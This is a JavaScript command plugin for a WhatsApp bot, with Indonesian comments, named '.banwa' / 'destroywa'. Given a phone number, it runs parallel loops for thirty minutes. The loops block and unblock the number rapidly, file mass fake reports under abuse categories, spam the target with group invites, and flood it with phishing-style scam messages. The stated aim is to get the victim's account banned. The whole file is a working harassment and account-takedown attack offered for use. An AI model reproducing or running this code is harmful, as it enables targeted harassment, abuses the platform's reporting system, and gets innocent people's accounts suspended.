let handler = async (m, { conn, text }) => {
    if (!text) return m.reply('Masukkan nomor target.\nContoh: .banwa 6285950388431')
    
    let number = text.replace(/[^0-9]/g, '')
    if (number.startsWith('0')) number = '62' + number.slice(1)
    if (number.startsWith('8')) number = '62' + number
    if (!number.endsWith('@s.whatsapp.net')) number += '@s.whatsapp.net'
    
    let target = number
    
    await m.reply(`🚀 Operasi banned dimulai\n👤 Target: ${target.replace('@s.whatsapp.net', '')}`)
    
    if (!global.banOps) global.banOps = {}
    global.banOps[target] = { 
        running: true, 
        blockCount: 0, 
        reportCount: 0, 
        inviteCount: 0,
        msgCount: 0,
        startTime: Date.now(),
        chatId: m.chat,
        lastLog: Date.now()
    }
    
    let ops = global.banOps[target]
    
    // ============================================
    // FUNGSI LOG
    // ============================================
    const sendLog = async (message) => {
        let now = Date.now()
        // Kirim log setiap 5 detik agar tidak spam
        if (now - ops.lastLog > 5000) {
            ops.lastLog = now
            try {
                await conn.sendMessage(ops.chatId, { text: message })
            } catch (e) {}
        }
    }
    
    // ============================================
    // LOOP 1: BLOCK & UNBLOCK RAPID
    // ============================================
    const blockUnblockLoop = async (id) => {
        while (ops.running) {
            try {
                await conn.updateBlockStatus(target, 'block')
                ops.blockCount++
                
                // Log setiap 10 block
                if (ops.blockCount % 10 === 0) {
                    await sendLog(`🔒 Block/Unblock: ${ops.blockCount}x | 📝 Report: ${ops.reportCount}x | 📨 Invite: ${ops.inviteCount}x | 💬 Msg: ${ops.msgCount}x`)
                }
                
                await new Promise(r => setTimeout(r, 200))
                
                await conn.updateBlockStatus(target, 'unblock')
                ops.blockCount++
                
                await new Promise(r => setTimeout(r, 200))
                
            } catch (e) {
                await sendLog(`⚠️ Error Block Loop ${id}: ${e.message?.substring(0, 50)}`)
                await new Promise(r => setTimeout(r, 1000))
                continue
            }
        }
        await sendLog(`🔴 Block Loop ${id} BERHENTI`)
    }
    
    // ============================================
    // LOOP 2: MASS REPORT
    // ============================================
    const massReportLoop = async (id) => {
        const categories = ['spam', 'abuse', 'harassment', 'impersonation', 'scam', 'illegal', 'violence', 'phishing']
        
        while (ops.running) {
            for (let cat of categories) {
                if (!ops.running) break
                try {
                    await conn.query({
                        tag: 'iq',
                        attrs: {
                            to: 's.whatsapp.net',
                            type: 'set',
                            xmlns: 'w:g2',
                            id: Math.random().toString(36).substring(2, 15)
                        },
                        content: [{
                            tag: cat,
                            attrs: {
                                jid: target,
                                action: 'report',
                                timestamp: Date.now().toString()
                            }
                        }]
                    })
                    ops.reportCount++
                    
                    if (ops.reportCount % 20 === 0) {
                        await sendLog(`📝 Report terkirim: ${ops.reportCount}x (${cat})`)
                    }
                    
                } catch (e) {
                    continue
                }
            }
            await new Promise(r => setTimeout(r, 500))
        }
        await sendLog(`🔴 Report Loop ${id} BERHENTI`)
    }
    
    // ============================================
    // LOOP 3: SPAM GROUP INVITE
    // ============================================
    const spamGroupInvite = async (id) => {
        while (ops.running) {
            try {
                let groupName = `WA_${Date.now().toString(36)}`
                let group = await conn.groupCreate(groupName, [target])
                
                if (group?.id) {
                    await conn.groupParticipantsUpdate(group.id, [target], 'remove')
                    await conn.groupLeave(group.id)
                    ops.inviteCount++
                    
                    if (ops.inviteCount % 5 === 0) {
                        await sendLog(`📨 Group Invite: ${ops.inviteCount}x`)
                    }
                }
            } catch (e) {
                await new Promise(r => setTimeout(r, 2000))
                continue
            }
            await new Promise(r => setTimeout(r, 1000))
        }
        await sendLog(`🔴 Invite Loop ${id} BERHENTI`)
    }
    
    // ============================================
    // LOOP 4: SPAM FLAGGED MESSAGE
    // ============================================
    const spamFlaggedMessage = async (id) => {
        const flaggedContent = [
            '⚠️ SCAM ALERT: Verifikasi akun anda di https://bit.ly/verify-now-secure',
            '🚨 AKUN ANDA TERKENA HACK, SEGERA KLIK LINK INI',
            '💰 FREE PULSA 1 JUTA: Daftar di https://bit.ly/free-pulsa-1jt',
            '📊 INVESTASI BODONG CUAN 1000% BERGARANSI',
            '❗ WHATSAPP ANDA AKAN DIHAPUS 24 JAM, VERIFIKASI: https://wa-verify.com',
            '🎰 JUDI ONLINE RESMI: Bonus new member 500%',
            '🔞 KONTEN TERLARANG: Akses di https://link-terlarang.com'
        ]
        
        while (ops.running) {
            for (let msg of flaggedContent) {
                if (!ops.running) break
                try {
                    await conn.sendMessage(target, {
                        text: msg,
                        contextInfo: {
                            forwardingScore: 999,
                            isForwarded: true,
                            externalAdReply: {
                                title: 'SPAM',
                                body: 'Reported Content',
                                thumbnailUrl: 'https://example.com/spam.jpg',
                                sourceUrl: 'https://bit.ly/spam-report'
                            }
                        }
                    })
                    ops.msgCount++
                    
                    if (ops.msgCount % 15 === 0) {
                        await sendLog(`💬 Flagged Message: ${ops.msgCount}x`)
                    }
                    
                } catch (e) {
                    await sendLog(`⚠️ Gagal kirim pesan: ${e.message?.substring(0, 30)}`)
                    await new Promise(r => setTimeout(r, 2000))
                    continue
                }
            }
            await new Promise(r => setTimeout(r, 400))
        }
        await sendLog(`🔴 Message Loop ${id} BERHENTI`)
    }
    
    // ============================================
    // STATUS MONITOR LOOP (LOG SETIAP 10 DETIK)
    // ============================================
    const statusMonitor = async () => {
        while (ops.running) {
            let durasi = Math.floor((Date.now() - ops.startTime) / 1000)
            let menit = Math.floor(durasi / 60)
            let detik = durasi % 60
            
            await sendLog(
                `📊 LIVE STATUS ${menit}:${detik.toString().padStart(2, '0')}\n` +
                `🔒 Block/Unblock : ${ops.blockCount}x\n` +
                `📝 Report        : ${ops.reportCount}x\n` +
                `📨 Group Invite  : ${ops.inviteCount}x\n` +
                `💬 Flagged Msg   : ${ops.msgCount}x\n` +
                `━━━━━━━━━━━━━━━━━━━━━━`
            )
            
            await new Promise(r => setTimeout(r, 10000))
        }
    }
    
    // ============================================
    // JALANKAN SEMUA LOOP PARALEL
    // ============================================
    await sendLog('⚡ Semua loop dimulai...')
    
    Promise.allSettled([
        blockUnblockLoop(1),
        blockUnblockLoop(2),
        blockUnblockLoop(3),
        blockUnblockLoop(4),
        blockUnblockLoop(5),
        massReportLoop(1),
        massReportLoop(2),
        massReportLoop(3),
        spamGroupInvite(1),
        spamFlaggedMessage(1),
        statusMonitor()
    ])
    
    // ============================================
    // AUTO STOP 30 MENIT
    // ============================================
    setTimeout(async () => {
        if (ops.running) {
            ops.running = false
            let durasi = Math.floor((Date.now() - ops.startTime) / 60000)
            await conn.sendMessage(ops.chatId, { 
                text: `✅ OPERASI BANNED SELESAI\n\n` +
                      `👤 Target        : ${target.replace('@s.whatsapp.net', '')}\n` +
                      `⏱️ Durasi        : ${durasi} menit\n` +
                      `🔒 Block/Unblock : ${ops.blockCount}x\n` +
                      `📝 Report        : ${ops.reportCount}x\n` +
                      `📨 Group Invite  : ${ops.inviteCount}x\n` +
                      `💬 Flagged Msg   : ${ops.msgCount}x\n\n` +
                      `⚠️ Cek nomor target, seharusnya sudah terkena banned/suspended.`
            })
            delete global.banOps[target]
        }
    }, 1800000)
}

handler.help = ['banwa 628xxxx']
handler.command = ['banwa', 'bannedwa', 'destroywa']
handler.tags = ['tools']
handler.register = true

export default handler